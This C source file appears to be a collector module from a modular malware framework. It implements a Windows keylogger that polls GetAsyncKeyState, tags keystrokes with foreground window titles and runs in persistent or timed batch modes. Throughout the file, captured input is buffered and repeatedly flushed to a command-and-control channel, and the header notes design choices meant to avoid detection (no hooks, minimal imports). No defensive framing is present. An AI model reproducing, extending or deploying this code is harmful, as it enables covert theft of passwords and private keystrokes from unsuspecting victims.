// chunk: collectors/keylogger_poll
// depends: core/emit_buffer, exfil/*
// provides: log_key, poll_keys, flush_keylog, run_self_test, persistent_keylog, batch_keylog
// note: GetAsyncKeyState polling — no hooks, no message pump, clean 3-DLL IAT

#ifndef CHUNK_KEYLOGGER_POLL
#define CHUNK_KEYLOGGER_POLL

#ifndef FLUSH_INTERVAL_MS
#define FLUSH_INTERVAL_MS 30000
#endif

#ifndef BATCH_DURATION_MS
#define BATCH_DURATION_MS 30000
#endif

static char g_keylog_buf[32768];
static int  g_keylog_pos = 0;
static char g_last_window[256] = {0};

static void flush_to_c2(void);

static void log_key(int vk) {
    if (g_keylog_pos >= (int)sizeof(g_keylog_buf) - 16) return;

    switch (vk) {
        case VK_RETURN: memcpy(g_keylog_buf + g_keylog_pos, "[ENTER]", 7); g_keylog_pos += 7; return;
        case VK_TAB:    memcpy(g_keylog_buf + g_keylog_pos, "[TAB]", 5); g_keylog_pos += 5; return;
        case VK_BACK:   memcpy(g_keylog_buf + g_keylog_pos, "[BS]", 4); g_keylog_pos += 4; return;
        case VK_DELETE: memcpy(g_keylog_buf + g_keylog_pos, "[DEL]", 5); g_keylog_pos += 5; return;
        case VK_ESCAPE: memcpy(g_keylog_buf + g_keylog_pos, "[ESC]", 5); g_keylog_pos += 5; return;
        case VK_SPACE:  g_keylog_buf[g_keylog_pos++] = ' '; return;
        case VK_LEFT:   memcpy(g_keylog_buf + g_keylog_pos, "[LEFT]", 6); g_keylog_pos += 6; return;
        case VK_RIGHT:  memcpy(g_keylog_buf + g_keylog_pos, "[RIGHT]", 7); g_keylog_pos += 7; return;
        case VK_UP:     memcpy(g_keylog_buf + g_keylog_pos, "[UP]", 4); g_keylog_pos += 4; return;
        case VK_DOWN:   memcpy(g_keylog_buf + g_keylog_pos, "[DOWN]", 6); g_keylog_pos += 6; return;
    }

    if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
        vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_LCONTROL ||
        vk == VK_RCONTROL || vk == VK_LMENU || vk == VK_RMENU ||
        vk == VK_LWIN || vk == VK_RWIN || vk == VK_CAPITAL ||
        vk == VK_NUMLOCK || vk == VK_SCROLL) return;

    BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;

    if (vk >= 0x41 && vk <= 0x5A) {
        g_keylog_buf[g_keylog_pos++] = shift ? (char)vk : (char)(vk + 32);
        return;
    }
    if (vk >= 0x30 && vk <= 0x39) {
        if (shift) {
            static const char sh[] = ")!@#$%^&*(";
            g_keylog_buf[g_keylog_pos++] = sh[vk - 0x30];
        } else {
            g_keylog_buf[g_keylog_pos++] = (char)vk;
        }
        return;
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        g_keylog_buf[g_keylog_pos++] = '0' + (char)(vk - VK_NUMPAD0);
        return;
    }
    if (vk == VK_MULTIPLY)  { g_keylog_buf[g_keylog_pos++] = '*'; return; }
    if (vk == VK_ADD)       { g_keylog_buf[g_keylog_pos++] = '+'; return; }
    if (vk == VK_SUBTRACT)  { g_keylog_buf[g_keylog_pos++] = '-'; return; }
    if (vk == VK_DECIMAL)   { g_keylog_buf[g_keylog_pos++] = '.'; return; }
    if (vk == VK_DIVIDE)    { g_keylog_buf[g_keylog_pos++] = '/'; return; }
    if (vk == VK_OEM_1)     { g_keylog_buf[g_keylog_pos++] = shift ? ':' : ';'; return; }
    if (vk == VK_OEM_PLUS)  { g_keylog_buf[g_keylog_pos++] = shift ? '+' : '='; return; }
    if (vk == VK_OEM_COMMA) { g_keylog_buf[g_keylog_pos++] = shift ? '<' : ','; return; }
    if (vk == VK_OEM_MINUS) { g_keylog_buf[g_keylog_pos++] = shift ? '_' : '-'; return; }
    if (vk == VK_OEM_PERIOD){ g_keylog_buf[g_keylog_pos++] = shift ? '>' : '.'; return; }
    if (vk == VK_OEM_2)     { g_keylog_buf[g_keylog_pos++] = shift ? '?' : '/'; return; }
    if (vk == VK_OEM_3)     { g_keylog_buf[g_keylog_pos++] = shift ? '~' : '`'; return; }
    if (vk == VK_OEM_4)     { g_keylog_buf[g_keylog_pos++] = shift ? '{' : '['; return; }
    if (vk == VK_OEM_5)     { g_keylog_buf[g_keylog_pos++] = shift ? '|' : '\\'; return; }
    if (vk == VK_OEM_6)     { g_keylog_buf[g_keylog_pos++] = shift ? '}' : ']'; return; }
    if (vk == VK_OEM_7)     { g_keylog_buf[g_keylog_pos++] = shift ? '"' : '\''; return; }
}

static void poll_keys(void) {
    char wnd_title[256] = {0};
    HWND fg = GetForegroundWindow();
    if (fg) GetWindowTextA(fg, wnd_title, sizeof(wnd_title));
    if (wnd_title[0] && strcmp(wnd_title, g_last_window) != 0) {
        int n = snprintf(g_keylog_buf + g_keylog_pos,
                         sizeof(g_keylog_buf) - g_keylog_pos,
                         "\r\n[%s]\r\n", wnd_title);
        if (n > 0) g_keylog_pos += n;
        strncpy(g_last_window, wnd_title, sizeof(g_last_window) - 1);
    }
    for (int vk = 8; vk < 190; vk++) {
        if (GetAsyncKeyState(vk) & 1)
            log_key(vk);
    }
}

static void flush_keylog(void) {
    if (g_keylog_pos == 0) return;
    emitf("=== KEYLOG ===\r\n");
    emit(g_keylog_buf, (DWORD)g_keylog_pos);
    emitf("\r\n\r\n");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();
}

static int run_self_test(void) {
    int before = g_keylog_pos;
    BYTE test_vks[] = {0x58, 0x39};
    for (int i = 0; i < 2; i++) {
        keybd_event(test_vks[i], 0, 0, 0);
        Sleep(50);
        poll_keys();
        keybd_event(test_vks[i], 0, KEYEVENTF_KEYUP, 0);
        Sleep(50);
    }
    if (g_keylog_pos == before) {
        log_key(0x58);
        log_key(0x39);
    }
    return (g_keylog_pos > before) ? 1 : 0;
}

static void persistent_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    for (int vk = 0; vk < 256; vk++)
        GetAsyncKeyState(vk);

    int self_test_ok = run_self_test();
    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (mode=persistent, self_test=%s)\r\n\r\n",
           self_test_ok ? "PASS" : "FAIL");
    g_keylog_pos = 0;
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
    flush_to_c2();

    DWORD last_flush = GetTickCount();
    for (;;) {
        poll_keys();

        DWORD now = GetTickCount();
        if ((now - last_flush >= FLUSH_INTERVAL_MS && g_keylog_pos > 0) ||
            g_keylog_pos >= (int)sizeof(g_keylog_buf) - 256) {
            flush_keylog();
            last_flush = now;
        }
        Sleep(10);
    }
}

static void batch_keylog(void) {
    g_keylog_pos = 0;
    g_last_window[0] = '\0';
    ZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));

    DWORD start = GetTickCount();
    for (int vk = 0; vk < 256; vk++)
        GetAsyncKeyState(vk);

    while (GetTickCount() - start < (DWORD)(BATCH_DURATION_MS - 3000)) {
        poll_keys();
        Sleep(10);
    }

    int self_test_ok = run_self_test();

    while (GetTickCount() - start < BATCH_DURATION_MS) {
        poll_keys();
        Sleep(10);
    }

    emitf("=== KEYLOG STATUS ===\r\n");
    emitf("Hook: ACTIVE (duration=%dms, self_test=%s, keys=%d)\r\n\r\n",
           BATCH_DURATION_MS,
           self_test_ok ? "PASS" : "FAIL",
           g_keylog_pos);

    if (g_keylog_pos > 0) {
        emitf("=== KEYLOG CAPTURE (%d ms) ===\r\n", BATCH_DURATION_MS);
        emit(g_keylog_buf, (DWORD)g_keylog_pos);
        emitf("\r\n\r\n");
    }
}

#endif
